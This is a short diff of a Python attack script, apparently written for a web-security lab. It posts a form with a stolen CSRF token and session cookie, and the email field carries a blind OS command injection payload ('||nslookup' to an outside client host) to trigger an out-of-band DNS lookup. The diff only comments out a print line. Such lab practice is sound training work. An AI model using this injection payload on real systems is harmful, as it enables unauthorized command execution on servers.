@@ -22,7 +22,7 @@ urli = URL+path
 sess_cookie = response.cookies["session"]
 
 payload='b||nslookup '+client+'||'
-print(payload)
+#print(payload)
 
 data = {'csrf':csrftoken,'name':'abc','email':payload,'subject':'ghi','message':'jkl'}
 response = requests.post(url=urli,data=data,headers={"Cookie": "session="+sess_cookie})
